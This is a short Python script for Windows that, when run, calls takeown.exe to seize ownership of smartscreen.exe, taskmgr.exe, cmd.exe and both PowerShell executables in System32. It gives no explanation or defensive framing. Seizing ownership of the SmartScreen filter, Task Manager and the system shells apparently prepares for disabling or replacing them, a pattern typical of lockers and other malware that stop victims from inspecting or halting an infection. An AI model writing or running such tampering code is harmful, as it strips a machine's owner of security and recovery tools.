#!/usr/bin/python
#coding:utf-8
import os, sys
# Function to get own process on windows
def tkOwn_process():
    proc = ['smartscreen.exe', 'taskmgr.exe', 'cmd.exe']
    for procs in proc:
        tkd = "\\windows\\system32\\takeown.exe /F \\Windows\\System32\\%s" %(procs)
        os.system(tkd)
    pwr_sh = ['powershell.exe', 'powershell_ise.exe']
    for procs in pwr_sh:
        tkd = "\\windows\\system32\\takeown.exe /F \\Windows\\System32\\WindowsPowerShell\\v1.0\\%s" %(procs)
        os.system(tkd)
tkOwn_process()
